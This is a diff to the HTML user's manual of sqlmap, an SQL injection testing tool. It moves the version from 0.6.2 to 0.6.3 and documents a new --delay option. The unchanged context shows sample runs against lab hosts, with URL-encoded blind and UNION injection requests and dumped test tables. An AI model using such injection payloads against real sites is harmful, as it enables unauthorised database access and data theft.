@@ -8,7 +8,7 @@
 <H1>sqlmap user's manual</H1>
 
 <H2>by 
-<A HREF="mailto:bernardo.damele@gmail.com">Bernardo Damele A. G.</A></H2>version 0.6.2, 4th of November 2008
+<A HREF="mailto:bernardo.damele@gmail.com">Bernardo Damele A. G.</A></H2>version 0.6.3, DDth of November 2008
 <HR>
 <EM>This document is the user's manual to use 
 <A HREF="http://sqlmap.sourceforge.net">sqlmap</A>.
@@ -295,19 +295,19 @@ It is available in various formats:</P>
 <P>
 <UL>
 <LI>
-<A HREF="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.2.tar.gz">Source gzip compressed</A> operating system independent.</LI>
+<A HREF="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.3.tar.gz">Source gzip compressed</A> operating system independent.</LI>
 <LI>
-<A HREF="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.2.tar.bz2">Source bzip2 compressed</A> operating system independent.</LI>
+<A HREF="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.3.tar.bz2">Source bzip2 compressed</A> operating system independent.</LI>
 <LI>
-<A HREF="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.2.zip">Source zip compressed</A> operating system independent.</LI>
+<A HREF="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.3.zip">Source zip compressed</A> operating system independent.</LI>
 <LI>
-<A HREF="http://downloads.sourceforge.net/sqlmap/sqlmap_0.6.2-1_all.deb">DEB binary package</A> architecture independent for Debian and any
+<A HREF="http://downloads.sourceforge.net/sqlmap/sqlmap_0.6.3-1_all.deb">DEB binary package</A> architecture independent for Debian and any
 other Debian derivated GNU/Linux distribution.</LI>
 <LI>
-<A HREF="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.2-1.noarch.rpm">RPM binary package</A> architecture independent for Fedora and any
+<A HREF="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.3-1.noarch.rpm">RPM binary package</A> architecture independent for Fedora and any
 other operating system that can install RPM packages.</LI>
 <LI>
-<A HREF="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.2_exe.zip">Portable executable for Windows</A> that <B>does not require the Python
+<A HREF="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.3_exe.zip">Portable executable for Windows</A> that <B>does not require the Python
 interpreter</B> to be installed on the operating system.</LI>
 </UL>
 </P>
@@ -334,7 +334,7 @@ and
 <PRE>
 $ python sqlmap.py -h
 
-    sqlmap/0.6.2 coded by Bernardo Damele A. G. &lt;bernardo.damele@gmail.com>
+    sqlmap/0.6.3 coded by Bernardo Damele A. G. &lt;bernardo.damele@gmail.com>
                         and Daniele Bellucci &lt;daniele.bellucci@gmail.com>
     
 Usage: sqlmap.py [options] {-u &lt;URL> | -g &lt;google dork> | -c &lt;config file>}
@@ -535,7 +535,7 @@ $ python sqlmap.py -u http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&amp;cat
 [hh:mm:28] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int.php?id=1&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 [hh:mm:29] [INFO] testing MySQL
@@ -544,7 +544,7 @@ Connection: close
 GET /sqlmap/mysql/get_int.php?id=1%20AND%20ORD%28MID%28%28CONCAT%28CHAR%2852%29%2C%20
 CHAR%2852%29%29%29%2C%201%2C%201%29%29%20%3E%2063%20AND%207994=7994&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </PRE>
@@ -562,7 +562,7 @@ $ python sqlmap.py -u http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&amp;cat
 [hh:mm:32] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int.php?id=1&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:32] [TRAFFIC IN] HTTP response (OK - 200):
@@ -580,7 +580,7 @@ Content-Type: text/html
 GET /sqlmap/mysql/get_int.php?id=1%20AND%20ORD%28MID%28%28CONCAT%28CHAR%2852%29%2C%20
 CHAR%2852%29%29%29%2C%201%2C%201%29%29%20%3E%2063%20AND%204435=4435&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:33] [TRAFFIC IN] HTTP response (OK - 200):
@@ -607,7 +607,7 @@ $ python sqlmap.py -u http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&amp;cat
 [hh:mm:23] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int.php?id=1&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:23] [TRAFFIC IN] HTTP response (OK - 200):
@@ -632,7 +632,7 @@ Content-Type: text/html
 GET /sqlmap/mysql/get_int.php?id=1%20AND%20ORD%28MID%28%28CONCAT%28CHAR%2851%29%2C%20
 CHAR%2851%29%29%29%2C%201%2C%201%29%29%20%3E%2063%20AND%201855=1855&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:24] [TRAFFIC IN] HTTP response (OK - 200):
@@ -749,7 +749,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1&amp;ca
 <BLOCKQUOTE><CODE>
 <PRE>
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&amp;cat=2" -v 1 \
-  -p user-agent --user-agent "sqlmap/0.6.2 (http://sqlmap.sourceforge.net)"
+  -p user-agent --user-agent "sqlmap/0.6.3 (http://sqlmap.sourceforge.net)"
 
 [hh:mm:40] [WARNING] the testable parameter 'user-agent' you provided is not into the GET
 [hh:mm:40] [INFO] testing connection to the target url
@@ -895,7 +895,7 @@ $ python sqlmap.py -u "http://192.168.1.125/sqlmap/get_str.asp?name=luther" -v 3
 [hh:mm:39] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/get_str.asp?name=luther HTTP/1.1
 Host: 192.168.1.125:80
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Cookie: ASPSESSIONIDSABTRCAS=HPCBGONANJBGFJFHGOKDMCGJ
 Connection: close
 
@@ -907,7 +907,7 @@ Connection: close
 GET /sqlmap/get_str.asp?name=luther HTTP/1.1
 Host: 192.168.1.125:80
 Cookie: ASPSESSIONIDSABTRCAS=469
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:40] [WARNING] Cookie parameter 'ASPSESSIONIDSABTRCAS' is not dynamic
@@ -955,7 +955,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1&amp;ca
 GET /sqlmap/pgsql/get_int.php?id=1&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
 Referer: http://www.google.com
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </PRE>
@@ -972,7 +972,7 @@ Connection: close
 <P>
 <BLOCKQUOTE><CODE>
 <PRE>
-sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 </PRE>
 </CODE></BLOCKQUOTE>
 </P>
@@ -1058,7 +1058,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/basic/get_int.php?id=1&
 GET /sqlmap/mysql/basic/get_int.php?id=1&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
 Authorization: Basic dGVzdHVzZXI6dGVzdHBhc3M=
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 
@@ -1075,7 +1075,7 @@ nonce="qcL9udlSBAA=f3b77da349fcfbf1a59ba37b21e291341159598f",
 uri="/sqlmap/mysql/digest/get_int.php?id=1&amp;cat=2", 
 response="e1bf3738b4bbe04e197a12fb134e13a2", algorithm="MD5", qop=auth, nc=00000001, 
 cnonce="df1c0902c931b640"
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </PRE>
@@ -1164,6 +1164,14 @@ character of the query output. The thread then ends after approximately
 seven HTTP requests, the maximum to retrieve a query output character.</P>
 
 
+<H3>Delay in seconds between each HTTP request</H3>
+
+<P>Option: <CODE>--delay</CODE></P>
+
+<P>It is possible to specify a number of seconds to wait between each HTTP
+request. The valid value is a float, for instance 0.5.</P>
+
+
 <H2><A NAME="ss5.2">5.2</A> <A HREF="#toc5.2">Injection</A>
 </H2>
 
@@ -1200,7 +1208,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=
 [hh:mm:50] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int_refresh.php?id=1&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:50] [TRAFFIC IN] HTTP response (OK - 200):
@@ -1222,7 +1230,7 @@ Content-Type: text/html
 [hh:mm:51] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int_refresh.php?id=1&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:51] [TRAFFIC IN] HTTP response (OK - 200):
@@ -1244,7 +1252,7 @@ Content-Type: text/html
 [hh:mm:51] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int_refresh.php?id=1&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:51] [TRAFFIC IN] HTTP response (OK - 200):
@@ -2072,7 +2080,7 @@ Table: users
 | 1  | luther                                       | blissett          |
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.6.2 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.6.3 (http://sqlmap.sourceforge.net) | user agent header |
 | 5  | NULL                                         | nameisnull        |
 +----+----------------------------------------------+-------------------+
 </PRE>
@@ -2126,7 +2134,7 @@ Table: users
 | 1  | luther                                       | blissett          |
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.6.2 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.6.3 (http://sqlmap.sourceforge.net) | user agent header |
 | 5  |                                              | nameisnull        |
 +----+----------------------------------------------+-------------------+
 
@@ -2140,7 +2148,7 @@ $ cat /software/sqlmap/output/192.168.1.121/dump/public/users.csv
 "1","luther","blissett"
 "2","fluffy","bunny"
 "3","wu","ming"
-"4","sqlmap/0.6.2 (http://sqlmap.sourceforge.net)","user agent header"
+"4","sqlmap/0.6.3 (http://sqlmap.sourceforge.net)","user agent header"
 "5","","nameisnull"
 </PRE>
 </CODE></BLOCKQUOTE>
@@ -2170,7 +2178,7 @@ Table: users
 +----+----------------------------------------------+-------------------+
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.6.2 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.6.3 (http://sqlmap.sourceforge.net) | user agent header |
 +----+----------------------------------------------+-------------------+
 </PRE>
 </CODE></BLOCKQUOTE>
@@ -2201,7 +2209,7 @@ Table: users
 | 1  | luther                                       | blissett          |
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.6.2 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.6.3 (http://sqlmap.sourceforge.net) | user agent header |
 | 5  | NULL                                         | nameisnull        |
 +----+----------------------------------------------+-------------------+
 
@@ -2291,7 +2299,7 @@ Table: users
 +----+----------------------------------------------+-------------------+
 | id | name                                         | surname           |
 +----+----------------------------------------------+-------------------+
-| 4  | sqlmap/0.6.2 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.6.3 (http://sqlmap.sourceforge.net) | user agent header |
 | 2  | fluffy                                       | bunny             |
 | 1  | luther                                       | blisset           |
 | 3  | wu                                           | ming              |
@@ -2854,7 +2862,7 @@ GET /sqlmap/mysql/get_int.php?id=1%20UNION%20ALL%20SELECT%20NULL%2C%20CONCAT%28C
 %2C%20CHAR%2832%29%29%2CCHAR%28122%2C110%2C105%2C89%2C121%2C65%29%29%2C%20NULL--%20AND%2
 06043=6043&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:25] [TRAFFIC IN] HTTP response (OK - 200):
@@ -2996,7 +3004,7 @@ $ python sqlmap.py --update -v 4
 [hh:mm:55] [TRAFFIC OUT] HTTP request:
 GET /doc/VERSION HTTP/1.1
 Host: sqlmap.sourceforge.net
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:55] [TRAFFIC IN] HTTP response (OK - 200):
@@ -3015,7 +3023,7 @@ X-Pad: avoid browser bug
 [hh:mm:56] [TRAFFIC OUT] HTTP request:
 GET /FAQs/SQLServerVersionDatabase/tabid/63/Default.aspx HTTP/1.1
 Host: www.sqlsecurity.com
-User-agent: sqlmap/0.6.2 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Cookie: .ASPXANONYMOUS=dvus03cqyQEkAAAANDI0M2QzZmUtOGRkOS00ZDQxLThhMTUtN2ExMWJiNWVjN2My0; 
 language=en-US
 Connection: close
